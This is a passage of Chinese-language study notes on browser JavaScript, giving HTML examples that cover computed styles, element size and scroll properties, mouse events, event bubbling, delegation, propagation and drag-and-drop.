但是如果在样式中使用了!important，则此时会有较高的优先级，即使通过JS也不能覆盖该样式，此时将会导致JS修改样式失效 所以尽量不要为样式添加!important */ box1.style.width = &quot;300px&quot;; box1.style.height = &quot;300px&quot;; box1.style.backgroundColor = &quot;cyan&quot;; &#125; // 点击按钮2之后，读取元素的样式 btn02.onclick = function () &#123; // 读取box1的样式 /* 语法：元素.style.样式名 通过style属性设置和读取的都是内联样式 无法读取样式表中的样式 */ console.log(box1.style); console.log(typeof box1.style); //object alert(box1.style.backgroundColor); alert(typeof box1.style.backgroundColor); // string &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;button&gt;效果切换&lt;/button&gt; &lt;button&gt;读取效果&lt;/button&gt; &lt;div id=&quot;box1&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 108 获取元素的样式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;获取元素内联样式&lt;/title&gt;&lt;/head&gt;&lt;style&gt; #box1 &#123; width: 100px; height: 100px; background-color: #8080ff; &#125;&lt;/style&gt;&lt;script&gt; window.onload = function () &#123; /* background-color默认值为transparent */ // 点击按钮读取box1的样式 var box1 = document.getElementById(&quot;box1&quot;); var btn01 = document.getElementById(&quot;btn01&quot;); btn01.onclick = function () &#123; // 读取box1的宽度 // alert(box1.style.width); /* 读取元素的当前显示样式 语法：元素.currentStyle.样式名 它可以用来读取当前正在显示的样式 如果当前元素没有设置该样式，则获取它的默认值 注意：currentStyle只有IE浏览器支持，其他浏览器不支持！ */ // alert(box1.currentStyle.width); // alert(box1.currentStyle.backgroundColor); /* 在其他浏览器中可以使用 getComputedStyle()这个方法来获取元素当前显示的样式 这个方法是window的方法，可以直接使用 需要两个参数 第一个：要获取样式的元素 第二个参数：可以传递一个伪元素，一般传递null 该方法会返回一个对象，对象中封装了当前元素对应的样式 可以通过对象.样式名来读取样式 如果获取的样式没有设置，则会获取到真实的值，而不是默认值 比如：没有设置width，他不会获取auto，而是一个长度 但是不支持IE8及其以下浏览器 注意：通过currentStyle和getComputedStyle()读取到的样式都是只读的，不能修改，如果要修改只能通过style属性来修改！！！ */ var obj = getComputedStyle(box1, null); console.log(obj); console.log(typeof obj); // object console.log(obj.height); console.log(obj.backgroundColor); // rgb(128, 128, 255) &#125; /* 定义一个函数来指定元素的当前样式，兼容不同浏览器 参数： obj：要获取样式的元素 name：要获取的样式名 */ function getStyle(obj, name) &#123; // 正常浏览器的方式，具有getComputedStyle()方法 if (window.getComputedStyle) &#123; /* 这里window.属性 用的很巧妙，因为属性不存在返回undefined 而不加window代表变量，层层寻找没有后会报错 */ return getComputedStyle(obj, null)[name]; &#125; else &#123; return obj.currentStyle[name]; &#125; /* 方案二： if(obj.currentStyle) &#123; return obj.currentStyle[name]; &#125; else&#123; return getComputedStyle(obj, null)[name]; &#125; 方案一改进： return window.getComputedStyle?getComputedStyle(obj, null)[name]:obj.currentStyle[name] */ &#125; &#125;&lt;/script&gt;&lt;body&gt; &lt;button id=&quot;btn01&quot;&gt;点击&lt;/button&gt; &lt;div id=&quot;box1&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 109 getStyle()方法见108 110 其他样式相关属性123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;其他样式相关属性&lt;/title&gt; &lt;style&gt; #box1 &#123; width: 100px; height: 100px; background-color: #8080ff; /* 撑开元素 */ padding: 10px; border: 10px solid cyan; &#125; #box2 &#123; margin: 100px; background-color: yellowgreen; &#125; #box4 &#123; height: 200px; width: 200px; background-color: lightpink; overflow: auto; &#125; #box5 &#123; height: 400px; width: 400px; background-color: black; &#125; &lt;/style&gt; &lt;script&gt; window.onload = function () &#123; var btn01 = document.getElementById(&quot;btn01&quot;); var box1 = document.getElementById(&quot;box1&quot;); var box4 = document.getElementById(&quot;box4&quot;); btn01.onclick = function () &#123; /* clientWidth clientHeight - 这两个属性可以获取元素的可见宽度和高度 - 这些属性都是不带px的，返回的都是一个数字，可以直接进行计算 - 会获取元素宽度和高度，包括内容区和内边距 - 注意：这些属性都是只读的，不能修改 offsetHeight offsetWidth - 获取元素的整个高度和宽度，包括内容区、内边距和边框 offsetParent - 可以用来获取当前元素的定位父元素 - 获取到离当前元素最近的开启了定位的祖先元素（定位默认为static，不算做开启定位，absolute/relative才算），如果所有的祖先元素都没有开启定位，则返回body offsetLeft - 当前元素相对于其定位元素的水平偏移量 offsetTop - 当前元素相对于其定位元素的垂直偏移量 scrollHeight scrollWidth - 可以获取元素整个滚动条区域的高度或长度 scrollLeft - 获取水平滚动条滚动的距离 scrollTop - 获取垂直滚动条滚动的距离 */ console.log(box1.clientWidth); //120 console.log(box1.clientHeight); console.log(box1.offsetWidth); // 140 console.log(box1.offsetHeight); var op = box1.offsetParent; console.log(op); console.log(box1.offsetLeft); // 100 console.log(box1.offsetTop); //0 console.log(box4.clientHeight); // 200 console.log(box4.scrollHeight);// 400 console.log(box4.scrollWidth);// 400 console.log(box4.clientHeight);// 183，因为滚动条的为17px /* 当满足了scrollHeight - scrollTop == clientHeight 说明了垂直滚动条滚动到底了 当满足了scrollWidth - scrollLeft == clientWidth 说明了水平滚动条滚动到底了 */ console.log(box4.scrollHeight - box4.scrollTop); &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;button id=&quot;btn01&quot;&gt;点击&lt;/button&gt; &lt;br /&gt;&lt;br /&gt; &lt;div id=&quot;box4&quot;&gt; &lt;div id=&quot;box5&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;box3&quot; style=&quot;position:relative;&quot;&gt; &lt;div id=&quot;box2&quot;&gt; &lt;div id=&quot;box1&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 110（2）练习12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;练习&lt;/title&gt; &lt;style&gt; #content &#123; width: 200px; height: 200px; overflow: auto; background-color: #8080ff; color: cyan; &#125; &lt;/style&gt; &lt;script&gt; window.onload = function () &#123; var content = document.getElementById(&quot;content&quot;); var checkBox = document.getElementById(&quot;check&quot;); var submitButton = document.getElementById(&quot;submit&quot;); content.onscroll = function () &#123; console.log(content.scrollHeight - content.scrollTop); if (Math.round(content.scrollHeight - content.scrollTop) == content.clientHeight) &#123; checkBox.disabled = false; subm.disabled = false; &#125; &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;注册须知&lt;/h3&gt; &lt;p id=&quot;content&quot;&gt; ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼ycy羽川翼 &lt;/p&gt; &lt;input type=&quot;checkbox&quot; disabled=&quot;disabled&quot; id=&quot;check&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; disabled=&quot;disabled&quot; id=&quot;subm&quot;&gt;&lt;/body&gt;&lt;/html&gt; 111 事件对象123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;title&gt;事件对象&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; #areaDiv &#123; border: 1px solid black; width: 300px; height: 50px; margin-bottom: 10px; &#125; #showMsg &#123; border: 1px solid black; width: 300px; height: 20px; &#125; &lt;/style&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function () &#123; /* * 当鼠标在areaDiv中移动时，在showMsg中来显示鼠标的坐标 */ //获取两个div var areaDiv = document.getElementById(&quot;areaDiv&quot;); var showMsg = document.getElementById(&quot;showMsg&quot;); /* * onmousemove * - 该事件将会在鼠标在元素中移动时被触发 * * 事件对象 * - 当事件的响应函数被触发时，浏览器每次都会将一个事件对象作为实参传递进响应函数, * 在事件对象中封装了当前事件相关的一切信息，比如：鼠标的坐标 键盘哪个按键被按下 鼠标滚轮滚动的方向。。。 */ areaDiv.onmousemove = function (event) &#123; /* * 在IE8中，响应函数被触发时，浏览器不会传递事件对象， * 在IE8及以下的浏览器中，是将事件对象作为window对象的属性保存的 */ /*if(!event)&#123; event = window.event; &#125;*/ //解决事件对象的兼容性问题 event = event || window.event; /* * clientX可以获取鼠标指针的水平坐标 * cilentY可以获取鼠标指针的垂直坐标 */ var x = event.clientX; var y = event.clientY; //alert(&quot;x = &quot;+x + &quot; , y = &quot;+y); //在showMsg中显示鼠标的坐标 showMsg.innerHTML = &quot;x = &quot; + x + &quot; , y = &quot; + y; &#125;; &#125;; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;areaDiv&quot;&gt;&lt;/div&gt; &lt;div id=&quot;showMsg&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 112 div跟随鼠标移动123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;div跟随鼠标移动&lt;/title&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; #move &#123; background-color: #8080ff; width: 100px; height: 100px; &#125; &lt;/style&gt; &lt;script&gt; window.onload = function () &#123; var move = document.getElementById(&quot;move&quot;); document.onmousemove = function (event) &#123; event = event || window.event; /* clientX、clientY 用于获取鼠标在当前的可见窗口的坐标 */ var x = event.clientX; var y = event.clientY; /* pageX、pageY 用于获取鼠标相对于当前页面的坐标 但是该属性在IE8中不支持，如果需要兼容IE8，就需要其他方法 var x = event.pageX; var y = event.pageY; */ var st1 = document.documentElement.scrollTop; var st2 = document.documentElement.scrollLeft; move.style.marginLeft = x + st2 + &quot;px&quot;; move.style.marginTop = y + st1 + &quot;px&quot;; &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body style=&quot;height:1000px;&quot;&gt; &lt;div id=&quot;move&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 113 事件冒泡1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; #box1&#123; width: 200px; height: 200px; background-color: yellowgreen; &#125; #s1&#123; background-color: yellow; &#125; &lt;/style&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function()&#123; /* * 事件的冒泡（Bubble） * - 所谓的冒泡指的就是事件的向上传导，当后代元素上的事件被触发时，其祖先元素的相同事件也会被触发 * - 在开发中大部分情况冒泡都是有用的,如果不希望发生事件冒泡可以通过事件对象来取消冒泡 * */ //为s1绑定一个单击响应函数 var s1 = document.getElementById(&quot;s1&quot;); s1.onclick = function(event)&#123; event = event || window.event; alert(&quot;我是span的单击响应函数&quot;); //取消冒泡 //可以将事件对象的cancelBubble设置为true，即可取消冒泡 event.cancelBubble = true; &#125;; //为box1绑定一个单击响应函数 var box1 = document.getElementById(&quot;box1&quot;); box1.onclick = function(event)&#123; event = event || window.event; alert(&quot;我是div的单击响应函数&quot;); event.cancelBubble = true; &#125;; //为body绑定一个单击响应函数 document.body.onclick = function()&#123; alert(&quot;我是body的单击响应函数&quot;); &#125;; &#125;; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;box1&quot;&gt; 我是box1 &lt;span id=&quot;s1&quot;&gt;我是span&lt;/span&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; #box1 &#123; width: 100px; height: 100px; background-color: red; /* * 开启box1的绝对定位 */ position: absolute; &#125; &lt;/style&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function () &#123; /* * 使div可以跟随鼠标移动 */ //获取box1 var box1 = document.getElementById(&quot;box1&quot;); //绑定鼠标移动事件 document.onmousemove = function (event) &#123; //解决兼容问题 event = event || window.event; //获取滚动条滚动的距离 var st = document.documentElement.scrollTop; var sl = document.documentElement.scrollLeft; //获取到鼠标的坐标 /* * clientX和clientY * 用于获取鼠标在当前的可见窗口的坐标 * div的偏移量，是相对于整个页面的 * * pageX和pageY可以获取鼠标相对于当前页面的坐标 * 但是这个两个属性在IE8中不支持，所以如果需要兼容IE8，则不要使用 */ var left = event.clientX; var top = event.clientY; //设置div的偏移量 box1.style.left = left + sl + &quot;px&quot;; box1.style.top = top + st + &quot;px&quot;; &#125;; var box2 = document.getElementById(&quot;box2&quot;); box2.onmousemove = function (event) &#123; event = event || window.event; event.cancelBubble = true; &#125;; &#125;; &lt;/script&gt;&lt;/head&gt;&lt;body style=&quot;height: 1000px;width: 2000px;&quot;&gt; &lt;div id=&quot;box2&quot; style=&quot;width: 500px; height: 500px; background-color: #bfa;&quot;&gt;&lt;/div&gt; &lt;div id=&quot;box1&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 114 事件的委派1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function()&#123; var u1 = document.getElementById(&quot;u1&quot;); //点击按钮以后添加超链接 var btn01 = document.getElementById(&quot;btn01&quot;); btn01.onclick = function()&#123; //创建一个li var li = document.createElement(&quot;li&quot;); li.innerHTML = &quot;&lt;a href=&#x27;javascript:;&#x27; class=&#x27;link&#x27;&gt;新建的超链接&lt;/a&gt;&quot;; //将li添加到ul中 u1.appendChild(li); &#125;; /* * 为每一个超链接都绑定一个单击响应函数 * 这里我们为每一个超链接都绑定了一个单击响应函数，这种操作比较麻烦， * 而且这些操作只能为已有的超链接设置事件，而新添加的超链接必须重新绑定 */ //获取所有的a var allA = document.getElementsByTagName(&quot;a&quot;); //遍历 /*for(var i=0 ; i&lt;allA.length ; i++)&#123; allA[i].onclick = function()&#123; alert(&quot;我是a的单击响应函数！！！&quot;); &#125;; &#125;*/ /* * 我们希望，只绑定一次事件，即可应用到多个的元素上，即使元素是后添加的 * 我们可以尝试将其绑定给元素的共同的祖先元素 * * 事件的委派 * - 指将事件统一绑定给元素的共同的祖先元素，这样当后代元素上的事件触发时，会一直冒泡到祖先元素 * 从而通过祖先元素的响应函数来处理事件。 * - 事件委派是利用了冒泡，通过委派可以减少事件绑定的次数，提高程序的性能 */ //为ul绑定一个单击响应函数 u1.onclick = function(event)&#123; event = event || window.event; /* * target * - event中的target表示的触发事件的对象 */ //alert(event.target); //如果触发事件的对象是我们期望的元素，则执行否则不执行 if(event.target.className == &quot;link&quot;)&#123; alert(&quot;我是ul的单击响应函数&quot;); &#125; &#125;; &#125;; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button id=&quot;btn01&quot;&gt;添加超链接&lt;/button&gt; &lt;ul id=&quot;u1&quot; style=&quot;background-color: #bfa;&quot;&gt; &lt;li&gt; &lt;p&gt;我是p元素&lt;/p&gt; &lt;/li&gt; &lt;li&gt;&lt;a href=&quot;javascript:;&quot; class=&quot;link&quot;&gt;超链接一&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;javascript:;&quot; class=&quot;link&quot;&gt;超链接二&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;javascript:;&quot; class=&quot;link&quot;&gt;超链接三&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/body&gt;&lt;/html&gt; 115 事件的绑定123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function()&#123; /* * 点击按钮以后弹出一个内容 */ //获取按钮对象 var btn01 = document.getElementById(&quot;btn01&quot;); /* * 使用 对象.事件 = 函数 的形式绑定响应函数， * 它只能同时为一个元素的一个事件绑定一个响应函数， * 不能绑定多个，如果绑定了多个，则后边会覆盖掉前边的 */ //为btn01绑定一个单击响应函数 /*btn01.onclick = function()&#123; alert(1); &#125;;*/ //为btn01绑定第二个响应函数 /*btn01.onclick = function()&#123; alert(2); &#125;;*/ /* * addEventListener() * - 通过这个方法也可以为元素绑定响应函数 * - 参数： * 1.事件的字符串，不要on * 2.回调函数，当事件触发时该函数会被调用 * 3.是否在捕获阶段触发事件，需要一个布尔值，一般都传false * * 使用addEventListener()可以同时为一个元素的相同事件同时绑定多个响应函数， * 这样当事件被触发时，响应函数将会按照函数的绑定顺序执行 * * 这个方法不支持IE8及以下的浏览器 */ /*btn01.addEventListener(&quot;click&quot;,function()&#123; alert(1); &#125;,false); btn01.addEventListener(&quot;click&quot;,function()&#123; alert(2); &#125;,false); btn01.addEventListener(&quot;click&quot;,function()&#123; alert(3); &#125;,false);*/ /* * attachEvent() * - 在IE8中可以使用attachEvent()来绑定事件 * - 参数： * 1.事件的字符串，要on * 2.回调函数 * * - 这个方法也可以同时为一个事件绑定多个处理函数， * 不同的是它是后绑定先执行，执行顺序和addEventListener()相反 */ /*btn01.attachEvent(&quot;onclick&quot;,function()&#123; alert(1); &#125;); btn01.attachEvent(&quot;onclick&quot;,function()&#123; alert(2); &#125;); btn01.attachEvent(&quot;onclick&quot;,function()&#123; alert(3); &#125;);*/ /*btn01.addEventListener(&quot;click&quot;,function()&#123; alert(this); &#125;,false);*/ /*btn01.attachEvent(&quot;onclick&quot;,function()&#123; alert(this); &#125;);*/ bind(btn01 , &quot;click&quot; , function()&#123; alert(this); &#125;); &#125;; //定义一个函数，用来为指定元素绑定响应函数 /* * addEventListener()中的this，是绑定事件的对象 * attachEvent()中的this，是window * 需要统一两个方法this */ /* * 参数： * obj 要绑定事件的对象 * eventStr 事件的字符串(不要on) * callback 回调函数 */ function bind(obj , eventStr , callback)&#123; if(obj.addEventListener)&#123; //大部分浏览器兼容的方式 obj.addEventListener(eventStr , callback , false); &#125;else&#123; /* * this是谁由调用方式决定 * callback.call(obj) */ //IE8及以下 obj.attachEvent(&quot;on&quot;+eventStr , function()&#123; //在匿名函数中调用回调函数 callback.call(obj); &#125;); &#125; &#125; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button id=&quot;btn01&quot;&gt;点我一下&lt;/button&gt; &lt;/body&gt;&lt;/html&gt; 117 事件的传播123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; #box1&#123; width: 300px; height: 300px; background-color: yellowgreen; &#125; #box2&#123; width: 200px; height: 200px; background-color: yellow; &#125; #box3&#123; width: 150px; height: 150px; background-color: skyblue; &#125; &lt;/style&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function()&#123; /* * 分别为三个div绑定单击响应函数 */ var box1 = document.getElementById(&quot;box1&quot;); var box2 = document.getElementById(&quot;box2&quot;); var box3 = document.getElementById(&quot;box3&quot;); /* * 事件的传播 * - 关于事件的传播网景公司和微软公司有不同的理解 * - 微软公司认为事件应该是由内向外传播，也就是当事件触发时，应该先触发当前元素上的事件， * 然后再向当前元素的祖先元素上传播，也就说事件应该在冒泡阶段执行。 * - 网景公司认为事件应该是由外向内传播的，也就是当前事件触发时，应该先触发当前元素的最外层的祖先元素的事件， * 然后在向内传播给后代元素 * - W3C综合了两个公司的方案，将事件传播分成了三个阶段 * 1.捕获阶段 * - 在捕获阶段时从最外层的祖先元素，向目标元素进行事件的捕获，但是默认此时不会触发事件 * 2.目标阶段 * - 事件捕获到目标元素，捕获结束开始在目标元素上触发事件 * 3.冒泡阶段 * - 事件从目标元素向他的祖先元素传递，依次触发祖先元素上的事件 * * - 如果希望在捕获阶段就触发事件，可以将addEventListener()的第三个参数设置为true * 一般情况下我们不会希望在捕获阶段触发事件，所以这个参数一般都是false * * - IE8及以下的浏览器中没有捕获阶段 */ bind(box1,&quot;click&quot;,function()&#123; alert(&quot;我是box1的响应函数&quot;) &#125;); bind(box2,&quot;click&quot;,function()&#123; alert(&quot;我是box2的响应函数&quot;) &#125;); bind(box3,&quot;click&quot;,function()&#123; alert(&quot;我是box3的响应函数&quot;) &#125;); &#125;; function bind(obj , eventStr , callback)&#123; if(obj.addEventListener)&#123; //大部分浏览器兼容的方式 obj.addEventListener(eventStr , callback , true); &#125;else&#123; /* * this是谁由调用方式决定 * callback.call(obj) */ //IE8及以下 obj.attachEvent(&quot;on&quot;+eventStr , function()&#123; //在匿名函数中调用回调函数 callback.call(obj); &#125;); &#125; &#125; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;box1&quot;&gt; &lt;div id=&quot;box2&quot;&gt; &lt;div id=&quot;box3&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 118 拖拽12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; #box1&#123; width: 100px; height: 100px; background-color: red; position: absolute; &#125; #box2&#123; width: 100px; height: 100px; background-color: yellow; position: absolute; left: 200px; top: 200px; &#125; &lt;/style&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function()&#123; /* * 拖拽box1元素 * - 拖拽的流程 * 1.当鼠标在被拖拽元素上按下时，开始拖拽 onmousedown * 2.当鼠标移动时被拖拽元素跟随鼠标移动 onmousemove * 3.当鼠标松开时，被拖拽元素固定在当前位置 onmouseup */ //获取box1 var box1 = document.getElementById(&quot;box1&quot;); //为box1绑定一个鼠标按下事件 //当鼠标在被拖拽元素上按下时，开始拖拽 onmousedown box1.onmousedown = function(event)&#123; event = event || window.event; //div的偏移量 鼠标.clentX - 元素.offsetLeft //div的偏移量 鼠标.clentY - 元素.offsetTop var ol = event.clientX - box1.offsetLeft; var ot = event.clientY - box1.offsetTop; //为document绑定一个onmousemove事件 document.onmousemove = function(event)&#123; event = event || window.event; //当鼠标移动时被拖拽元素跟随鼠标移动 onmousemove //获取鼠标的坐标 var left = event.clientX - ol; var top = event.clientY - ot; //修改box1的位置 box1.style.left = left+&quot;px&quot;; box1.style.top = top+&quot;px&quot;; &#125;; //为document绑定一个鼠标松开事件 document.onmouseup = function()&#123; //当鼠标松开时，被拖拽元素固定在当前位置 onmouseup //取消document的onmousemove事件 document.onmousemove = null; //取消document的onmouseup事件 document.onmouseup = null; &#125;; &#125;; &#125;; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;box1&quot;&gt;&lt;/div&gt; &lt;div id=&quot;box2&quot;&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 119 拖拽12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; #box1 &#123; width: 100px; height: 100px; background-color: red; position: absolute; &#125; #box2 &#123; width: 100px; height: 100px; background-color: yellow; position: absolute; left: 200px; top: 200px; &#125; &lt;/style&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function () &#123; var box1 = document.getElementById(&quot;box1&quot;); var box2 = document.getElementById(&quot;box2&quot;); box1.onmousedown = function (event) &#123; //设置box1捕获所有鼠标按下的事件 /* * setCapture() * - 只有IE支持，但是在火狐中调用时不会报错， * 而如果使用chrome调用，会报错 */ /*if(box1.setCapture)&#123; box1.setCapture(); &#125;*/ box1.setCapture &amp;&amp; box1.setCapture(); event = event || window.event; var ol = event.clientX - box1.offsetLeft; var ot = event.clientY - box1.offsetTop; document.onmousemove = function (event) &#123; event = event || window.event; var left = event.clientX - ol; var top = event.clientY - ot; box1.style.left = left + &quot;px&quot;; box1.style.top = top + &quot;px&quot;; &#125;; document.onmouseup = function () &#123; document.onmousemove = null; document.onmouseup = null; box1.releaseCapture &amp;&amp; box1.releaseCapture(); &#125;; /* * 当我们拖拽一个网页中的内容时，浏览器会默认去搜索引擎中搜索内容， * 此时会导致拖拽功能的异常，这个是浏览器提供的默认行为， * 如果不希望发生这个行为，则可以通过return false来取消默认行为 * * 但是这招对IE8不起作用 */ return false; &#125;; &#125;; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; 我是一段文字 &lt;div id=&quot;box1&quot;&gt;&lt;/div&gt; &lt;div id=&quot;box2&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function () &#123; //分别为两个按钮绑定单击响应函数 var btn01 = document.getElementById(&quot;btn01&quot;); var btn02 = document.getElementById(&quot;btn02&quot;); btn01.onclick = function () &#123; alert(1); &#125;; btn02.onclick = function () &#123; alert(2); &#125;; //设置btn01对鼠标按下相关的事件进行捕获 //当调用一个元素的setCapture()方法以后，这个元素将会把下一次所有的鼠标按下相关的事件捕获到自身上 btn01.setCapture(); // 只在IE中生效 &#125;; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;button 